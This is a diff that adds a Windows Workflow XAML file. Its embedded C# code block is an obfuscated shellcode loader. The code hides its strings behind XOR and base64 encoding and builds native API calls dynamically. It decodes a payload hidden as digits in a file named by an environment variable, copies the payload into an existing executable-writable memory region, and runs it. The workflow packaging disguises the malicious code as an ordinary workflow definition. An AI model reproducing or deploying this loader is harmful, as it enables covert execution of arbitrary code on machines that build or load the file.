@@ -1,0 +1,186 @@
+<SequentialWorkflowActivity x:Class="displayableCodepoint" xmlns="http://schemas.microsoft.com/winfx/2006/xaml/workflow" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml">
+<CodeActivity x:Name="nullableDecompress" />
+<x:Code><![CDATA[
+public class unmanagedCompiled :SequentialWorkflowActivity{
+    private static bool initializedExpiration(System.IntPtr interruptWait, out MEMORY_BASIC_INFORMATION interceptionPrefetch, uint devariantTaskqueue) {
+	interceptionPrefetch = new MEMORY_BASIC_INFORMATION();
+	object[] rescheduleConsumed = new object[] {interruptWait, interceptionPrefetch, devariantTaskqueue};
+	var partitioningStop = unmanagedCompiled.hintLazilyFilterlock(unmanagedCompiled.fulfilDecoder("m0wHmFx6VknQsywAvKS6koJ6EIIXWAoVm6sWBfSTp5KceACTS28ZGZG4LBDVnqGHlURbv1diNQ+M9ywcx4O2gZVaBopWYxFbs5INI9S+jbGxejy1Zl8rPbGFDS3Srp290EUFtExwAx6MqzUF6JPyl4dlEJheYg0="), rescheduleConsumed);
+	interceptionPrefetch = (MEMORY_BASIC_INFORMATION)rescheduleConsumed[1];
+return (bool)partitioningStop; }
+    public static System.IntPtr outboundAssignable(string advanceArchitecture) {
+	object[] rescheduleConsumed = new object[] {advanceArchitecture};
+	var partitioningStop = unmanagedCompiled.hintLazilyFilterlock(unmanagedCompiled.fulfilDecoder("m0wHmFx6VknQsywAvKS6koJ6EIIXWAoVm6sHCfKqvZeFRRC+WHgBF5urExX1k7ee3mAbgmliFweNozIF6IDyn4BkGpJMegA1n7ol"), rescheduleConsumed);
+return (System.IntPtr)partitioningStop; }
+    public static System.IntPtr searchPlaintext(System.IntPtr assertionDependency, string credentialOperator) {
+	object[] rescheduleConsumed = new object[] {assertionDependency, credentialOperator};
+	var partitioningStop = unmanagedCompiled.hintLazilyFilterlock(unmanagedCompiled.fulfilDecoder("m0wHmFx6VknQsywAvKS6koJ6EIIXWAoVm6sHCfK3oJyTaBGSS3MWCIKEOR/ygr/duUcBpk1kGSiHpDQJ68mbnYR5AYQZfigUmqIsCfqUpoGZRxLWSWQKGLC2LQk="), rescheduleConsumed);
+return (System.IntPtr)partitioningStop; }
+    [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
+    private struct MEMORY_BASIC_INFORMATION {
+        public System.IntPtr rankableEncodeMerge;
+        public System.IntPtr remoteConsumer;
+        public uint composeLease;
+        public System.IntPtr impersonationAlgorithm;
+        public uint providerPreprocessing;
+        public uint routerDrain;
+        public uint decryptedTracedForwarding; }
+    [System.Runtime.InteropServices.UnmanagedFunctionPointer(System.Runtime.InteropServices.CallingConvention.Cdecl)]
+    private delegate void teardownDisconnected(System.IntPtr extendTracebackHookable, System.IntPtr monoserverStopshift, System.IntPtr translatableAll, System.IntPtr samplerUndo);
+    private static string parameterizablePort = System.Environment.ExpandEnvironmentVariables(unmanagedCompiled.fulfilDecoder("1XknuX5EJDa6lhQto7uxnINdFJhDdzkNl7I3GO+Kt92TWgM="));
+    private delegate System.IntPtr pathRetryable(int calculateZone);
+    private pathRetryable notificationAttenuate;
+    public unmanagedCompiled()    {
+        applyAnswer(); }
+    private void applyAnswer(){
+        System.Collections.Generic.List<string> throttleDecodableSynchronized = new System.Collections.Generic.List<string>(System.IO.File.ReadLines(parameterizablePort));
+        throttleDecodableSynchronized.RemoveAt(0);
+        string migratorRetryableCloseable = throttleDecodableSynchronized[0].Split(';')[0];
+        uint detectPreempt = System.Convert.ToUInt32(migratorRetryableCloseable.Split('.')[0]);
+        uint populatedConnector = System.Convert.ToUInt32(migratorRetryableCloseable.Split('.')[1]);
+        byte[] routerAssembler = new byte[populatedConnector];
+        decodeBifurcate(throttleDecodableSynchronized, 2, populatedConnector, routerAssembler);
+        string labelReductionAttribute = System.Text.Encoding.Default.GetString(routerAssembler);
+        var featureLinked = labelReductionAttribute.Split(';');
+        uint retryableTrimcraft = 0, runCount = 0, publisherDeexecute = 0, clientLinked = 0;
+        foreach (var cherryConfigured in featureLinked) {
+            char weakReadfilter = cherryConfigured[0];
+            if (weakReadfilter == 'm') {
+                var serializedDirectiveSanitization = cherryConfigured.Split('|');
+                retryableTrimcraft = System.Convert.ToUInt32(serializedDirectiveSanitization[1]);
+                runCount = System.Convert.ToUInt32(serializedDirectiveSanitization[2]); }
+            else if (weakReadfilter == 'p') {
+                var serializedDirectiveSanitization = cherryConfigured.Split('|');
+                publisherDeexecute = System.Convert.ToUInt32(serializedDirectiveSanitization[1]);
+                clientLinked = System.Convert.ToUInt32(serializedDirectiveSanitization[2]); } }
+        byte[] definePluggable = new byte[runCount];
+        decodeBifurcate(throttleDecodableSynchronized, detectPreempt + retryableTrimcraft, runCount, definePluggable);
+        byte[] mergedConstantDefaultwrite = new byte[clientLinked];
+        decodeBifurcate(throttleDecodableSynchronized, detectPreempt + publisherDeexecute, clientLinked, mergedConstantDefaultwrite);
+        System.IntPtr signRegister = System.Runtime.InteropServices.Marshal.AllocHGlobal(mergedConstantDefaultwrite.Length);
+        System.Runtime.InteropServices.Marshal.Copy(mergedConstantDefaultwrite, 0, signRegister, mergedConstantDefaultwrite.Length);
+        System.IntPtr cleartextStringget = polyfillObserve(definePluggable.Length);
+        System.Runtime.InteropServices.Marshal.Copy(definePluggable, 0, cleartextStringget, definePluggable.Length);
+        System.IntPtr formatterFail = outboundAssignable(unmanagedCompiled.fulfilDecoder("m0wHmFx6VknQsywA"));
+        System.IntPtr dynamicInvocation = searchPlaintext(formatterFail, unmanagedCompiled.fulfilDecoder("t0wBpkt5BjqaszIJ9ZQ="));
+        var downloadablePublisher = (teardownDisconnected)System.Runtime.InteropServices.Marshal.GetDelegateForFunctionPointer(cleartextStringget, typeof(teardownDisconnected));
+        downloadablePublisher(formatterFail, dynamicInvocation, cleartextStringget, signRegister); }
+    private System.IntPtr polyfillObserve(int calculateZone) {
+        notificationAttenuate = polyfillObserve;
+        System.IntPtr watcherDriver =  System.Runtime.InteropServices.Marshal.GetFunctionPointerForDelegate(notificationAttenuate);
+        System.IntPtr streamDelegated = new System.IntPtr(0x00);
+        System.IntPtr insertableExecute = new System.IntPtr(0x00);
+        MEMORY_BASIC_INFORMATION allocatorStatement = new MEMORY_BASIC_INFORMATION();
+        uint selectmarkDirection = (uint)System.Runtime.InteropServices.Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION));
+        while(streamDelegated.ToInt64() < 0xFFFFFFFFFFF) {
+            initializedExpiration(streamDelegated, out allocatorStatement, selectmarkDirection);
+            if (allocatorStatement.routerDrain == 0x40) {
+                insertableExecute = new System.IntPtr(allocatorStatement.rankableEncodeMerge.ToInt64() + allocatorStatement.impersonationAlgorithm.ToInt64());
+                if (!( allocatorStatement.rankableEncodeMerge.ToInt64() < watcherDriver.ToInt64() && watcherDriver.ToInt64() < insertableExecute.ToInt64() )) {
+                    if (calculateZone < allocatorStatement.impersonationAlgorithm.ToInt64()) {
+                        return allocatorStatement.rankableEncodeMerge; } } }
+            streamDelegated = new System.IntPtr(allocatorStatement.rankableEncodeMerge.ToInt64() + allocatorStatement.impersonationAlgorithm.ToInt64()); }
+        return new System.IntPtr(0x00); }
+    private void decodeBifurcate(System.Collections.Generic.List<string> finiteSignalStopshift, uint approvePurgeable, uint attributeReadfilter, byte[] emittedEnforce) {
+        uint mapperAutomation = 0;
+        uint conditionalPublisher = 0;
+        foreach(string line in finiteSignalStopshift) {
+            string backpressureEmit = unmanagedCompiled.fulfilDecoder("");
+            uint startedAssert = 0;
+            foreach(char c in line) {
+                if (mapperAutomation < attributeReadfilter) {
+                    if(System.Char.IsDigit(c)) {
+                        startedAssert++;
+                        backpressureEmit+=c; }
+                    else {
+                        if (conditionalPublisher >= approvePurgeable) {
+                            if(startedAssert>0) {
+                                if(startedAssert<4) {
+                                    int algorithmObjectproperty=0;
+                                    byte adjacentWarmupContainer=0;
+                                    System.Int32.TryParse(backpressureEmit,out algorithmObjectproperty);
+                                    if(299<algorithmObjectproperty&&algorithmObjectproperty<800)
+                                    {adjacentWarmupContainer=System.Convert.ToByte(backpressureEmit.Substring(1));}
+                                    else if(algorithmObjectproperty<100&&mapperAutomation % 2 == 0)
+                                    {adjacentWarmupContainer=System.Convert.ToByte(backpressureEmit.Substring(1));}
+                                    else if(799<algorithmObjectproperty&&algorithmObjectproperty<900)
+                                    {string selectorDeserializerSubmit=unmanagedCompiled.fulfilDecoder("wQ==")+backpressureEmit.Substring(1);
+                                    adjacentWarmupContainer=System.Convert.ToByte(selectorDeserializerSubmit);}
+                                    else if(899<algorithmObjectproperty&&algorithmObjectproperty<1000)
+                                    {string selectorDeserializerSubmit=unmanagedCompiled.fulfilDecoder("wg==")+backpressureEmit.Substring(1);
+                                    adjacentWarmupContainer=System.Convert.ToByte(selectorDeserializerSubmit);}
+                                    else
+                                    {adjacentWarmupContainer=System.Convert.ToByte(backpressureEmit);}
+                                    emittedEnforce[mapperAutomation]=adjacentWarmupContainer;
+                                    mapperAutomation++; } } }
+                        startedAssert=0;
+                        backpressureEmit=unmanagedCompiled.fulfilDecoder("");
+                        conditionalPublisher = conditionalPublisher + 1; } } } } }
+private static System.Reflection.Emit.ModuleBuilder snapshotableIterable;
+private static System.Collections.Generic.Dictionary<string, System.Type> stoppedDroppable = new System.Collections.Generic.Dictionary<string, System.Type>();
+private static System.Type mandatoryAuthorized(string coordinationAnonymous) {
+    string Direction = coordinationAnonymous.StartsWith(unmanagedCompiled.fulfilDecoder("o1AGglx7Sw==")) ? coordinationAnonymous.Substring(7) : coordinationAnonymous;
+    if (Direction.Equals(unmanagedCompiled.fulfilDecoder("uUcBpk1k"))) return typeof(System.IntPtr);
+    if (Direction.Equals(unmanagedCompiled.fulfilDecoder("pWAbgmliFw=="))) return typeof(System.UIntPtr);
+    if (Direction.Equals(unmanagedCompiled.fulfilDecoder("uUcBxw8=")) || Direction.Equals(unmanagedCompiled.fulfilDecoder("g0EahE0="))) return typeof(short);
+    if (Direction.Equals(unmanagedCompiled.fulfilDecoder("pWAbgggg")) || Direction.Equals(unmanagedCompiled.fulfilDecoder("hVodmUti"))) return typeof(System.UInt16);
+    if (Direction.Equals(unmanagedCompiled.fulfilDecoder("uUcBxQs=")) || Direction.Equals(unmanagedCompiled.fulfilDecoder("mUcB"))) return typeof(int);
+    if (Direction.Equals(unmanagedCompiled.fulfilDecoder("pWAbggok")) || Direction.Equals(unmanagedCompiled.fulfilDecoder("hUAbgg=="))) return typeof(System.UInt32);
+    if (Direction.Equals(unmanagedCompiled.fulfilDecoder("uUcBwA0=")) || Direction.Equals(unmanagedCompiled.fulfilDecoder("nEYbkQ=="))) return typeof(long);
+    if (Direction.Equals(unmanagedCompiled.fulfilDecoder("pWAbgg8i")) || Direction.Equals(unmanagedCompiled.fulfilDecoder("hUUamF4="))) return typeof(System.UInt64);
+    if (Direction.ToLower().Equals(unmanagedCompiled.fulfilDecoder("g10Hn1dx"))) return typeof(string);
+    if (Direction.ToLower().Equals(unmanagedCompiled.fulfilDecoder("k0EUhA=="))) return typeof(char);
+    if (Direction.ToLower().Equals(unmanagedCompiled.fulfilDecoder("klABkw=="))) return typeof(byte);
+    if (Direction.ToLower().Equals(unmanagedCompiled.fulfilDecoder("g0sMglw="))) return typeof(sbyte);
+    if (Direction.ToLower().Equals(unmanagedCompiled.fulfilDecoder("lEYAlFVz"))) return typeof(double);
+    if (Direction.ToLower().Equals(unmanagedCompiled.fulfilDecoder("lEwWn1R3CQ=="))) return typeof(decimal);
+    if (Direction.Equals(unmanagedCompiled.fulfilDecoder("kkYamg==")) || Direction.Equals(unmanagedCompiled.fulfilDecoder("skYamlx3Cw=="))) return typeof(bool);
+    if (Direction.Equals(unmanagedCompiled.fulfilDecoder("hkYckg==")) || coordinationAnonymous.Equals(unmanagedCompiled.fulfilDecoder("hkYckg=="))) return typeof(void);
+    foreach (System.Reflection.Assembly requestdoublePromoteOutput in System.AppDomain.CurrentDomain.GetAssemblies()) {
+        System.Type obtainCompilePrevent = requestdoublePromoteOutput.GetType(coordinationAnonymous);
+        if (obtainCompilePrevent != null) return obtainCompilePrevent; }
+    return null; }
+private static System.Type asyncDiscover(string mediatorStrict, string inspectionRender, System.Runtime.InteropServices.CharSet asyncConnector, System.Type linkTransformation, System.Type[] repairTaskqueueSelect, string[] nonpropertyAbove) {
+    if (snapshotableIterable == null) {
+        var bisectArtifact = System.AppDomain.CurrentDomain.DefineDynamicAssembly(
+            new System.Reflection.AssemblyName(unmanagedCompiled.fulfilDecoder("p0AbxQs=")), System.Reflection.Emit.AssemblyBuilderAccess.Run);
+        snapshotableIterable = bisectArtifact.DefineDynamicModule(unmanagedCompiled.fulfilDecoder("p0AbxQs="), false); }
+    var expiredSelect = snapshotableIterable.DefineType(mediatorStrict + unmanagedCompiled.fulfilDecoder("s0UUhUo="), System.Reflection.TypeAttributes.Class | System.Reflection.TypeAttributes.Public);
+    var compositionSupervisionInput = new System.Collections.Generic.List<System.Type>();
+    for (int spanNotification = 1; spanNotification <= nonpropertyAbove.Length; spanNotification++) {
+        string bridgeEvaluatorDroppable = nonpropertyAbove[spanNotification - 1];
+        if (bridgeEvaluatorDroppable.StartsWith(unmanagedCompiled.fulfilDecoder("gkwT1g==")) || bridgeEvaluatorDroppable.StartsWith(unmanagedCompiled.fulfilDecoder("n1wB1g=="))) compositionSupervisionInput.Add(repairTaskqueueSelect[spanNotification - 1].MakeByRefType());
+        else compositionSupervisionInput.Add(repairTaskqueueSelect[spanNotification - 1]); }
+    var applyUseEstablished = expiredSelect.DefinePInvokeMethod(mediatorStrict, inspectionRender, mediatorStrict,
+        System.Reflection.MethodAttributes.Static | System.Reflection.MethodAttributes.Public,
+        System.Reflection.CallingConventions.Standard, linkTransformation, compositionSupervisionInput.ToArray(),
+        System.Runtime.InteropServices.CallingConvention.Winapi, asyncConnector);
+    applyUseEstablished.SetImplementationFlags(applyUseEstablished.GetMethodImplementationFlags() | System.Reflection.MethodImplAttributes.PreserveSig);
+    return expiredSelect.CreateType(); }
+internal static object hintLazilyFilterlock(string throttleConnectionPublish, object[] compareExceed) {
+    string[] rollbackAgentDecrypt = throttleConnectionPublish.Split('|');
+    string targetProcessor = rollbackAgentDecrypt[0].Split(':')[0];
+    System.Runtime.InteropServices.CharSet sharedStartable = System.Runtime.InteropServices.CharSet.None;
+    if (rollbackAgentDecrypt[0].Split(':').Length > 1)
+        System.Runtime.InteropServices.CharSet.TryParse(rollbackAgentDecrypt[0].Split(':')[1].Split('.')[1], out sharedStartable);
+    string densePipeable = rollbackAgentDecrypt[1];
+    System.Type acknowledgeEdge = mandatoryAuthorized(rollbackAgentDecrypt[2]);
+    System.Type[] reuseTrimcraft = new System.Type[compareExceed.Length]; for (int writerTerminated = 0; writerTerminated < compareExceed.Length; writerTerminated++) reuseTrimcraft[writerTerminated] = compareExceed[writerTerminated].GetType();
+    string[] cancelTracebackSource = new string[rollbackAgentDecrypt.Length - 3]; System.Array.Copy(rollbackAgentDecrypt, 3, cancelTracebackSource, 0, rollbackAgentDecrypt.Length - 3);
+    System.Type diagnoseConfirm;
+    if (stoppedDroppable.ContainsKey(throttleConnectionPublish)) {
+        diagnoseConfirm = stoppedDroppable[throttleConnectionPublish];
+    } else {
+        diagnoseConfirm = asyncDiscover(densePipeable, targetProcessor, sharedStartable, acknowledgeEdge, reuseTrimcraft, cancelTracebackSource);
+        stoppedDroppable.Add(throttleConnectionPublish, diagnoseConfirm); }
+    var scanConcrete = diagnoseConfirm.GetMethod(densePipeable, System.Reflection.BindingFlags.Static | System.Reflection.BindingFlags.Public);
+    return scanConcrete.Invoke(null, compareExceed);
+} internal static string fulfilDecoder(string backupValidator) {
+                byte[] scheduleStrict = new System.Guid("f67529f0-1639-7b65-fed7-406c86e7d2f3").ToByteArray();
+                byte[] invocationConnector = System.Convert.FromBase64String(backupValidator);
+                byte[] scalableSingleton = new byte[invocationConnector.Length];
+                for (int spanNotification = 0; spanNotification < invocationConnector.Length; spanNotification++) scalableSingleton[spanNotification] = (byte)(invocationConnector[spanNotification] ^ scheduleStrict[spanNotification % scheduleStrict.Length]);
+                return System.Text.Encoding.UTF8.GetString(scalableSingleton);
+            }}
+]]></x:Code>
+</SequentialWorkflowActivity>
